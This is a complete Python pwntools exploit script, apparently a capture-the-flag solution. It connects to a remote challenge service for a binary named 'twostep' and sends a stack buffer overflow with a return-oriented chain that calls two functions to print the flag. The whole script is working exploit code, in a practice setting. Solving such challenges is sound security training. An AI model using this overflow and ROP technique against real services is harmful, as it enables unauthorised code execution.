#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./bin/twostep", checksec=False)
proc = remote("165.227.103.166", 6003)

proc.recvuntil(b"microcelebrity in \n")
args_raw = proc.recvline().decode().split(" ")

payload = flat([
    b"A" * 440,                                 # padding
    p64(0x4011ca),                              # pop rdi; ret
    p64(int(args_raw[0])),                      # rdi = args[0]
    p64(elf.sym["right_foot_creep1"]),          # ret2stage0
    p64(0x4011ca),                              # pop rdi; ret
    p64(int(args_raw[3])),                      # rdi = args[1]
    p64(elf.sym["left2_foot_creep_FORBIDDEN"])  # ret2stage1
])

proc.sendlineafter(b"2 step game?\n", payload)
proc.recvuntil(b"for you: \n\n")
info(f"FLAG! {proc.recvline().decode()}")
proc.close()
